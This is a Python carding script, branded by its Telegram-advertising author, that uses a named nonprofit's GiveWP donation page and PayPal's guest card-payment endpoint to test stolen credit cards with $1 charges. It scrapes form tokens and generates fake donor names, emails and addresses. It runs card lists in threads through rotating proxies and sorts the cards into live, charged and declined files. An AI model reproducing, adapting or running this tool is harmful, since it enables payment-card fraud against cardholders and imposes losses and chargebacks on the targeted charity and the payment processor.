import requests
import re
import json
import random
import string
import base64
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import sys
import io
import argparse
from datetime import datetime
from typing import Dict, Any, Optional

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = CYAN = WHITE = MAGENTA = BLUE = LIGHTYELLOW_EX = LIGHTGREEN_EX = LIGHTRED_EX = LIGHTCYAN_EX = LIGHTMAGENTA_EX = LIGHTWHITE_EX = ""
    class Style:
        BRIGHT = RESET_ALL = DIM = ""

# ═══════════════════════════════════════════════════════════════
#  PAYPAL CHARGE — awwatersheds.org
#  Gateway: GiveWP + PayPal Commerce (Credit/Debit Card)
#  Amount: $1.00 USD | No Captcha
#  SCRIPT BY @MUMIRU_BRO
# ═══════════════════════════════════════════════════════════════

BANNER = f"""{Fore.LIGHTRED_EX}{Style.BRIGHT}
██████╗  █████╗ ██╗   ██╗██████╗  █████╗ ██╗          
██╔══██╗██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██║          
██████╔╝███████║ ╚████╔╝ ██████╔╝███████║██║          
██╔═══╝ ██╔══██║  ╚██╔╝  ██╔═══╝ ██╔══██║██║          
██║     ██║  ██║   ██║   ██║     ██║  ██║███████╗      
╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝      
{Fore.WHITE}
 ██████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ███████╗
██╔════╝██║  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝
██║     ███████║███████║██████╔╝██║  ███╗█████╗  
██║     ██╔══██║██╔══██║██╔══██╗██║   ██║██╔══╝  
╚██████╗██║  ██║██║  ██║██║  ██║╚██████╔╝███████╗
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝
{Fore.CYAN}{Style.BRIGHT}
            SCRIPT BY @MUMIRU_BRO              
{Fore.WHITE}╔══════════════════════════════════════════════════════════╗
║  {Fore.CYAN}Site: awwatersheds.org  │  PayPal Commerce  │  $1 USD{Fore.WHITE}  ║
║  {Fore.YELLOW}Gateway: GiveWP + PayPal CC  │  No Captcha{Fore.WHITE}             ║
║  {Fore.LIGHTGREEN_EX}Author: @MUMIRU_BRO  │  Free Tool{Fore.WHITE}                       ║
║  {Fore.LIGHTMAGENTA_EX}Channel: t.me/MUMIRU_BRO  │  Join for more!{Fore.WHITE}            ║
╚══════════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""



FIRST_NAMES = [
    "James","Mary","Robert","Patricia","John","Jennifer","Michael","Linda",
    "William","Elizabeth","David","Barbara","Richard","Susan","Joseph","Jessica",
    "Thomas","Sarah","Christopher","Karen","Daniel","Lisa","Matthew","Nancy",
    "Anthony","Betty","Mark","Margaret","Donald","Sandra","Steven","Ashley",
    "Paul","Dorothy","Andrew","Kimberly","Joshua","Emily","Kenneth","Donna"
]

LAST_NAMES = [
    "Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
    "Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson",
    "Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson",
    "White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson","Walker"
]


ADDRESSES = [
    {"line1": "742 Evergreen Terrace", "city": "Springfield", "state": "IL", "zip": "62704"},
    {"line1": "123 Maple Street", "city": "Anytown", "state": "NY", "zip": "10001"},
    {"line1": "456 Oak Avenue", "city": "Riverside", "state": "CA", "zip": "92501"},
    {"line1": "789 Pine Road", "city": "Lakewood", "state": "CO", "zip": "80226"},
    {"line1": "321 Elm Boulevard", "city": "Portland", "state": "OR", "zip": "97201"},
    {"line1": "654 Cedar Lane", "city": "Austin", "state": "TX", "zip": "73301"},
    {"line1": "987 Birch Drive", "city": "Denver", "state": "CO", "zip": "80201"},
    {"line1": "147 Walnut Court", "city": "Phoenix", "state": "AZ", "zip": "85001"},
    {"line1": "258 Spruce Way", "city": "Seattle", "state": "WA", "zip": "98101"},
    {"line1": "369 Willow Place", "city": "Miami", "state": "FL", "zip": "33101"},
]

PHONE_PREFIXES = ["212","310","312","415","602","713","206","305","404","503"]

EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com"]


def random_donor() -> Dict[str, str]:
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    addr = random.choice(ADDRESSES)
    phone = random.choice(PHONE_PREFIXES) + ''.join([str(random.randint(0,9)) for _ in range(7)])
    domain = random.choice(EMAIL_DOMAINS)
    email = f"{first.lower()}{random.randint(10,9999)}@{domain}"
    return {
        "first": first,
        "last": last,
        "email": email,
        "phone": phone,
        "address": addr
    }




class PayPalChargeEngine:
    """PAYPAL CHARGE Engine for awwatersheds.org | @MUMIRU_BRO"""

    def __init__(self, proxy: Optional[str] = None):
        self.session = requests.Session()
        self.session.verify = True
        self.last_error = ""
        if proxy:
            if proxy.count(':') == 3 and '@' not in proxy:
                p = proxy.split(':')
                fmt = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
                self.session.proxies = {"http": fmt, "https": fmt}
            elif '@' in proxy:
                self.session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            else:
                self.session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}

        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        self.ajax_headers = {
            "User-Agent": self.ua,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": "https://awwatersheds.org",
            "Referer": "https://awwatersheds.org/donate/",
            "X-Requested-With": "XMLHttpRequest"
        }
        self.tokens = {}

    def scrape_tokens(self) -> bool:
        try:
            r = self.session.get("https://awwatersheds.org/donate/", headers={"User-Agent": self.ua}, timeout=20)
            html = r.text
            h = re.search(r'name="give-form-hash" value="(.*?)"', html)
            if not h:
                h = re.search(r'"base_hash":"(.*?)"', html)
            if not h:
                self.last_error = "Hash not found"
                return False
            self.tokens['hash'] = h.group(1)
            self.tokens['pfx'] = re.search(r'name="give-form-id-prefix" value="(.*?)"', html).group(1)
            self.tokens['id'] = re.search(r'name="give-form-id" value="(.*?)"', html).group(1)
            return True
        except Exception as e:
            self.last_error = str(e)
            return False

    def register_donation(self, donor: Dict[str, str]) -> bool:
        data = {
            "give-honeypot": "",
            "give-form-id-prefix": self.tokens['pfx'],
            "give-form-id": self.tokens['id'],
            "give-form-title": "Sustainers Circle",
            "give-current-url": "https://awwatersheds.org/donate/",
            "give-form-url": "https://awwatersheds.org/donate/",
            "give-form-hash": self.tokens['hash'],
            "give-price-id": "custom",
            "give-amount": "1.00",
            "payment-mode": "paypal-commerce",
            "give_first": donor["first"],
            "give_last": donor["last"],
            "give_email": donor["email"],
            "give-lake-affiliation": "Other",
            "give_action": "purchase",
            "give-gateway": "paypal-commerce",
            "action": "give_process_donation",
            "give_ajax": "true"
        }
        try:
            r = self.session.post("https://awwatersheds.org/wp-admin/admin-ajax.php", headers=self.ajax_headers, data=data, timeout=20)
            return r.status_code == 200
        except:
            return False

    def create_order(self) -> Optional[str]:
        data = {
            "give-honeypot": "",
            "give-form-id-prefix": self.tokens['pfx'],
            "give-form-id": self.tokens['id'],
            "give-form-hash": self.tokens['hash'],
            "payment-mode": "paypal-commerce",
            "give-amount": "1.00",
            "give-gateway": "paypal-commerce",
        }
        try:
            r = self.session.post("https://awwatersheds.org/wp-admin/admin-ajax.php",
                                  params={"action": "give_paypal_commerce_create_order"},
                                  headers=self.ajax_headers, data=data, timeout=20)
            rj = r.json()
            if rj.get("success") and "data" in rj:
                return rj["data"]["id"]
            return None
        except:
            return None

    @staticmethod
    def detect_type(n: str) -> str:
        n = n.replace(" ", "").replace("-", "")
        if n.startswith("4"): return "VISA"
        elif re.match(r"^5[1-5]", n) or re.match(r"^2[2-7]", n): return "MASTER_CARD"
        elif n.startswith(("34", "37")): return "AMEX"
        elif n.startswith(("6011", "65")) or re.match(r"^64[4-9]", n): return "DISCOVER"
        return "VISA"

    def charge_card(self, order_id: str, card: Dict[str, str], donor: Dict[str, str]) -> str:
        """Send card to PayPal GraphQL and return raw response text."""
        addr = donor["address"]
        graphql_h = {
            "Host": "www.paypal.com",
            "Paypal-Client-Context": order_id,
            "X-App-Name": "standardcardfields",
            "Paypal-Client-Metadata-Id": order_id,
            "User-Agent": self.ua,
            "Content-Type": "application/json",
            "Origin": "https://www.paypal.com",
            "Referer": f"https://www.paypal.com/smart/card-fields?token={order_id}",
            "X-Country": "US"
        }

        query = """
        mutation payWithCard(
            $token: String!
            $card: CardInput
            $paymentToken: String
            $phoneNumber: String
            $firstName: String
            $lastName: String
            $shippingAddress: AddressInput
            $billingAddress: AddressInput
            $email: String
            $currencyConversionType: CheckoutCurrencyConversionType
            $installmentTerm: Int
            $identityDocument: IdentityDocumentInput
            $feeReferenceId: String
        ) {
            approveGuestPaymentWithCreditCard(
                token: $token
                card: $card
                paymentToken: $paymentToken
                phoneNumber: $phoneNumber
                firstName: $firstName
                lastName: $lastName
                email: $email
                shippingAddress: $shippingAddress
                billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType
                installmentTerm: $installmentTerm
                identityDocument: $identityDocument
                feeReferenceId: $feeReferenceId
            ) {
                flags { is3DSecureRequired }
                cart {
                    intent
                    cartId
                    buyer { userId auth { accessToken } }
                    returnUrl { href }
                }
                paymentContingencies {
                    threeDomainSecure {
                        status method
                        redirectUrl { href }
                        parameter
                    }
                }
            }
        }
        """

        full_yy = card['yy'] if len(card['yy']) == 4 else "20" + card['yy']
        billing = {
            "givenName": donor["first"], "familyName": donor["last"],
            "line1": addr["line1"], "line2": None,
            "city": addr["city"], "state": addr["state"],
            "postalCode": addr["zip"], "country": "US"
        }

        variables = {
            "token": order_id,
            "card": {
                "cardNumber": card["number"],
                "type": self.detect_type(card["number"]),
                "expirationDate": f"{card['mm']}/{full_yy}",
                "postalCode": addr["zip"],
                "securityCode": card["cvc"]
            },
            "phoneNumber": donor["phone"],
            "firstName": donor["first"],
            "lastName": donor["last"],
            "email": donor["email"],
            "billingAddress": billing,
            "shippingAddress": billing,
            "currencyConversionType": "PAYPAL"
        }

        try:
            r = requests.post(
                "https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard",
                headers=graphql_h,
                json={"query": query, "variables": variables},
                timeout=30
            )
            return r.text
        except Exception as e:
            return f"ERROR: {e}"

    def approve_order(self, order_id: str) -> str:
        data = {
            "give-honeypot": "",
            "give-form-id-prefix": self.tokens['pfx'],
            "give-form-id": self.tokens['id'],
            "give-form-hash": self.tokens['hash'],
            "payment-mode": "paypal-commerce",
            "give-amount": "1.00",
            "give-gateway": "paypal-commerce",
        }
        try:
            r = self.session.post(
                "https://awwatersheds.org/wp-admin/admin-ajax.php",
                params={"action": "give_paypal_commerce_approve_order", "order": order_id},
                headers=self.ajax_headers, data=data, timeout=30
            )
            return r.text
        except Exception as e:
            return f"ERROR: {e}"



#  @MUMIRU_BRO


def analyze_response(paypal_text: str, approve_text: str = "") -> Dict[str, str]:
    """Analyze ONLY the PayPal GraphQL response for real payment status.
    The GiveWP approve response is checked separately to avoid false positives."""
    t = paypal_text.upper() if paypal_text else ""


    if 'APPROVESTATE":"APPROVED' in t:
        return {"status": "CHARGED", "emoji": "✅", "msg": "CHARGED - Payment Approved!"}
    if 'PARENTTYPE":"AUTH' in t and '"CARTID"' in t:
        return {"status": "CHARGED", "emoji": "✅", "msg": "CHARGED - Auth Successful!"}

    if '"APPROVEGUESTPAYMENTWITHCREDITCARD"' in t and '"ERRORS"' not in t and '"CARTID"' in t:
        return {"status": "CHARGED", "emoji": "✅", "msg": "CHARGED!"}


    if 'CVV2_FAILURE' in t:
        return {"status": "APPROVED", "emoji": "✅", "msg": "CVV2 FAILURE (Card is LIVE)"}
    if 'INVALID_SECURITY_CODE' in t:
        return {"status": "APPROVED", "emoji": "✅", "msg": "CCN - Invalid Security Code (LIVE)"}
    if 'INVALID_BILLING_ADDRESS' in t:
        return {"status": "APPROVED", "emoji": "✅", "msg": "AVS FAILED (LIVE)"}
    if 'EXISTING_ACCOUNT_RESTRICTED' in t:
        return {"status": "APPROVED", "emoji": "✅", "msg": "Account Restricted (LIVE)"}


    if 'INSUFFICIENT_FUNDS' in t:
        return {"status": "LIVE", "emoji": "💰", "msg": "Insufficient Funds (LIVE CARD)"}


    combined = t + " " + (approve_text.upper() if approve_text else "")
    declines = [
        ('DO_NOT_HONOR',                    'Do Not Honor'),
        ('ACCOUNT_CLOSED',                  'Account Closed'),
        ('PAYER_ACCOUNT_LOCKED_OR_CLOSED',  'Account Locked/Closed'),
        ('LOST_OR_STOLEN',                  'LOST OR STOLEN'),
        ('SUSPECTED_FRAUD',                 'SUSPECTED FRAUD'),
        ('INVALID_ACCOUNT',                 'INVALID ACCOUNT'),
        ('REATTEMPT_NOT_PERMITTED',         'REATTEMPT NOT PERMITTED'),
        ('ACCOUNT_BLOCKED_BY_ISSUER',       'ACCOUNT BLOCKED BY ISSUER'),
        ('ORDER_NOT_APPROVED',              'ORDER NOT APPROVED'),
        ('PICKUP_CARD_SPECIAL_CONDITIONS',  'PICKUP CARD'),
        ('PAYER_CANNOT_PAY',                'PAYER CANNOT PAY'),
        ('GENERIC_DECLINE',                 'GENERIC DECLINE'),
        ('COMPLIANCE_VIOLATION',            'COMPLIANCE VIOLATION'),
        ('TRANSACTION_NOT_PERMITTED',       'TRANSACTION NOT PERMITTED'),
        ('PAYMENT_DENIED',                  'PAYMENT DENIED'),
        ('INVALID_TRANSACTION',             'INVALID TRANSACTION'),
        ('RESTRICTED_OR_INACTIVE_ACCOUNT',  'RESTRICTED/INACTIVE ACCOUNT'),
        ('SECURITY_VIOLATION',              'SECURITY VIOLATION'),
        ('DECLINED_DUE_TO_UPDATED_ACCOUNT', 'DECLINED - UPDATED ACCOUNT'),
        ('INVALID_OR_RESTRICTED_CARD',      'INVALID/RESTRICTED CARD'),
        ('EXPIRED_CARD',                    'EXPIRED CARD'),
        ('CRYPTOGRAPHIC_FAILURE',           'CRYPTOGRAPHIC FAILURE'),
        ('TRANSACTION_CANNOT_BE_COMPLETED', 'CANNOT BE COMPLETED'),
        ('DECLINED_PLEASE_RETRY',           'DECLINED - RETRY LATER'),
        ('TX_ATTEMPTS_EXCEED_LIMIT',        'TX ATTEMPTS EXCEED LIMIT'),
    ]
    for keyword, msg in declines:
        if keyword in combined:
            return {"status": "DECLINED", "emoji": "❌", "msg": msg}


    try:
        rj = json.loads(paypal_text)
        if "errors" in rj:
            return {"status": "DECLINED", "emoji": "❌", "msg": rj["errors"][0].get("message", "Unknown")}
    except:
        pass
    try:
        rj = json.loads(approve_text)
        if rj.get("data", {}).get("error"):
            return {"status": "DECLINED", "emoji": "❌", "msg": str(rj["data"]["error"])}
    except:
        pass

    return {"status": "DECLINED", "emoji": "❌", "msg": "UNKNOWN ERROR"}




def parse_cc(cc_str: str) -> Optional[Dict[str, str]]:
    parts = re.split(r'[|:,]', cc_str.strip())
    if len(parts) >= 4:
        cc = parts[0].strip()
        mm = parts[1].strip().zfill(2)
        yy = parts[2].strip()
        cvv = parts[3].strip()
        if len(yy) == 2: yy = "20" + yy
        return {"number": cc, "mm": mm, "yy": yy, "cvc": cvv}
    return None

file_lock = threading.Lock()

def save_result(cc_str: str, status: str, msg: str):
    fmap = {"CHARGED": "sucess.txt", "APPROVED": "sucess.txt", "LIVE": "sufficient funds.txt", "DECLINED": "declined.txt"}
    fn = fmap.get(status, "erro.txt")
    with file_lock:
        with open(fn, "a", encoding="utf-8") as f:
            f.write(f"{cc_str} -> {status}: {msg}\n")

def load_proxies(path: str) -> list:
    if os.path.exists(path):
        with open(path, "r") as f:
            return [l.strip() for l in f if l.strip()]
    return []




#  @MUMIRU_BRO


def check_card(cc_str: str, proxy: Optional[str] = None) -> Dict[str, str]:
    card = parse_cc(cc_str)
    if not card:
        return {"status": "ERROR", "emoji": "⚠️", "msg": "Invalid format (CC|MM|YY|CVV)"}

    donor = random_donor()
    engine = PayPalChargeEngine(proxy=proxy)

    if not engine.scrape_tokens():
        return {"status": "ERROR", "emoji": "⚠️", "msg": f"Token scrape failed: {engine.last_error}"}

    if not engine.register_donation(donor):
        return {"status": "ERROR", "emoji": "⚠️", "msg": "Donation registration failed"}

    order_id = engine.create_order()
    if not order_id:
        return {"status": "ERROR", "emoji": "⚠️", "msg": "PayPal order creation failed"}

    graphql_resp = engine.charge_card(order_id, card, donor)
    approve_resp = engine.approve_order(order_id)


    return analyze_response(graphql_resp, approve_resp)



#  PAYPAL CHARGE | SCRIPT BY @MUMIRU_BRO


def main():
    if sys.stdout.encoding != 'utf-8':
        try:
            sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
        except:
            pass

    print(BANNER)


    parser = argparse.ArgumentParser(description="PAYPAL CHARGE | @MUMIRU_BRO")
    parser.add_argument("--cc", help="Single CC: CC|MM|YY|CVV")
    parser.add_argument("--file", help="File with CCs")
    parser.add_argument("--proxy", help="Proxy or proxy file")
    args = parser.parse_args()

    if args.cc or args.file:
        proxies = []
        if args.proxy:
            proxies = load_proxies(args.proxy) if os.path.exists(args.proxy) else [args.proxy]
        ccs = []
        if args.cc:
            ccs.append(args.cc)
        elif args.file and os.path.exists(args.file):
            with open(args.file, "r") as f:
                ccs = [l.strip() for l in f if l.strip()]
        run_mass(ccs, proxies)
        return


    while True:
        print(f"\n{Fore.CYAN}{Style.BRIGHT}╔═══════════════════════════════════════════════════╗")
        print(f"║  {Fore.WHITE}PAYPAL CHARGE  │  SCRIPT BY @MUMIRU_BRO{Fore.CYAN}           ║")
        print(f"║  {Fore.LIGHTMAGENTA_EX}t.me/MUMIRU_BRO  │  Free for all members{Fore.CYAN}         ║")
        print(f"╠═══════════════════════════════════════════════════╣")
        print(f"║  {Fore.WHITE}1. {Fore.GREEN}Single Check{Fore.CYAN}                                 ║")
        print(f"║  {Fore.WHITE}2. {Fore.YELLOW}Mass Check{Fore.CYAN}                                   ║")
        print(f"║  {Fore.WHITE}3. {Fore.RED}Exit{Fore.CYAN}                                         ║")
        print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}")
        choice = input(f"\n{Fore.WHITE}{Style.BRIGHT}  ➤ Select Option: {Style.RESET_ALL}").strip()

        if choice == "1":
            single_mode()
        elif choice == "2":
            mass_mode()
        elif choice == "3":
            print(f"\n{Fore.CYAN}  Peace out! Join t.me/MUMIRU_BRO for more free tools 🔥")
            print(f"  @MUMIRU_BRO | @MUMIRU_BRO | @MUMIRU_BRO{Style.RESET_ALL}\n")
            break
        else:
            print(f"{Fore.RED}  Invalid option bruh. Pick 1, 2, or 3.{Style.RESET_ALL}")


def single_mode():
    print(f"\n{Fore.CYAN}{Style.BRIGHT}{'─'*50}")
    print(f"  ⚡ SINGLE CHECK  │  @MUMIRU_BRO")
    print(f"{'─'*50}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  Format: {Fore.YELLOW}CC|MM|YY|CVV{Fore.WHITE} or {Fore.YELLOW}CC|MM|YYYY|CVV{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  Example: {Fore.LIGHTCYAN_EX}4185497154154915|11|33|461{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  Example: {Fore.LIGHTCYAN_EX}4185497154154915|11|2033|461{Style.RESET_ALL}")
    cc = input(f"\n{Fore.WHITE}{Style.BRIGHT}  CC: {Style.RESET_ALL}").strip()
    if not cc:
        print(f"{Fore.RED}  No CC entered.{Style.RESET_ALL}")
        return

    print(f"\n{Fore.YELLOW}  [*] CC: {cc}")
    print(f"  [*] Gateway: PayPal Commerce (awwatersheds.org)")
    print(f"  [*] Amount: $1.00 USD")
    print(f"  [*] @MUMIRU_BRO - Processing...{Style.RESET_ALL}\n")

    result = check_card(cc, None)
    s, e, m = result["status"], result["emoji"], result["msg"]

    color = Fore.GREEN if s in ("CHARGED","APPROVED") else Fore.YELLOW if s == "LIVE" else Fore.RED if s == "DECLINED" else Fore.MAGENTA
    print(f"\n{color}{Style.BRIGHT}  {e} [{s}] {cc}")
    print(f"     ↳ {m}{Style.RESET_ALL}")

    save_result(cc, s, m)
    print(f"\n{Fore.CYAN}  Result saved │ @MUMIRU_BRO{Style.RESET_ALL}")


def mass_mode():
    print(f"\n{Fore.CYAN}{Style.BRIGHT}{'─'*50}")
    print(f"  ⚡ MASS CHECK  │  @MUMIRU_BRO")
    print(f"{'─'*50}{Style.RESET_ALL}")


    print(f"\n{Fore.WHITE}  Proxy file path {Fore.YELLOW}(optional, press Enter to skip){Style.RESET_ALL}")
    px = input(f"{Fore.WHITE}{Style.BRIGHT}  Proxy File: {Style.RESET_ALL}").strip()
    proxies = []
    if px:
        if os.path.exists(px):
            proxies = load_proxies(px)
            print(f"{Fore.GREEN}  ✓ Loaded {len(proxies)} proxies{Style.RESET_ALL}")
        else:
            proxies = [px]
            print(f"{Fore.GREEN}  ✓ Using single proxy{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}  ⤳ No proxy, going raw{Style.RESET_ALL}")


    print(f"\n{Fore.WHITE}  CC file path")
    print(f"  Format: {Fore.YELLOW}CC|MM|YY|CVV{Fore.WHITE} or {Fore.YELLOW}CC|MM|YYYY|CVV{Fore.WHITE} (one per line){Style.RESET_ALL}")
    fp = input(f"{Fore.WHITE}{Style.BRIGHT}  CC File: {Style.RESET_ALL}").strip()
    if not fp:
        print(f"{Fore.RED}  No file entered.{Style.RESET_ALL}")
        return

    if not os.path.exists(fp):
        print(f"{Fore.RED}  File not found: {fp}{Style.RESET_ALL}")
        return

    with open(fp, "r") as f:
        ccs = [l.strip() for l in f if l.strip()]
    if not ccs:
        print(f"{Fore.RED}  No cards found in file.{Style.RESET_ALL}")
        return

    print(f"\n{Fore.GREEN}  ✓ Loaded {len(ccs)} cards{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}  [*] Gateway: PayPal Commerce │ $1.00 USD")
    print(f"  [*] @MUMIRU_BRO - Starting mass check...{Style.RESET_ALL}\n")

    run_mass(ccs, proxies)


print_lock = threading.Lock()

def run_mass(ccs: list, proxies: list):
    total = len(ccs)
    counts = {"CHARGED": 0, "APPROVED": 0, "LIVE": 0, "DECLINED": 0, "ERROR": 0}
    counts_lock = threading.Lock()
    checked = [0]  

    THREADS = 5
    print(f"{Fore.CYAN}  [*] Running with {THREADS} threads{Style.RESET_ALL}\n")

    def process_card(cc):
        proxy = random.choice(proxies) if proxies else None
        result = check_card(cc, proxy)
        s, e, m = result["status"], result["emoji"], result["msg"]

        with counts_lock:
            counts[s] = counts.get(s, 0) + 1
            checked[0] += 1
            idx = checked[0]

        color = Fore.GREEN if s in ("CHARGED","APPROVED") else Fore.YELLOW if s == "LIVE" else Fore.RED if s == "DECLINED" else Fore.MAGENTA
        ts = datetime.now().strftime('%H:%M:%S')
        with print_lock:
            print(f"{Fore.WHITE}[{ts}] [{idx}/{total}] {cc}")
            print(f"{color}{Style.BRIGHT}  {e} {s} » {m}{Style.RESET_ALL}")

        save_result(cc, s, m)

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(process_card, cc): cc for cc in ccs}
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as exc:
                cc = futures[future]
                with print_lock:
                    print(f"{Fore.RED}  ⚠️ Thread error for {cc}: {exc}{Style.RESET_ALL}")


    print(f"\n{Fore.CYAN}{Style.BRIGHT}{'═'*50}")
    print(f"  RESULTS SUMMARY  │  @MUMIRU_BRO")
    print(f"{'═'*50}{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}✅ Charged:  {counts.get('CHARGED',0)}{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}✅ Approved: {counts.get('APPROVED',0)}{Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}💰 Live:     {counts.get('LIVE',0)}{Style.RESET_ALL}")
    print(f"  {Fore.RED}❌ Declined: {counts.get('DECLINED',0)}{Style.RESET_ALL}")
    print(f"  {Fore.MAGENTA}⚠️  Errors:   {counts.get('ERROR',0)}{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}📊 Total:    {total}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'═'*50}")
    print(f"  {Fore.LIGHTCYAN_EX}Files: sucess.txt / declined.txt / sufficient funds.txt / erro.txt")
    print(f"  {Fore.LIGHTMAGENTA_EX}PAYPAL CHARGE by @MUMIRU_BRO │ t.me/MUMIRU_BRO{Style.RESET_ALL}\n")


if __name__ == "__main__":
    main()
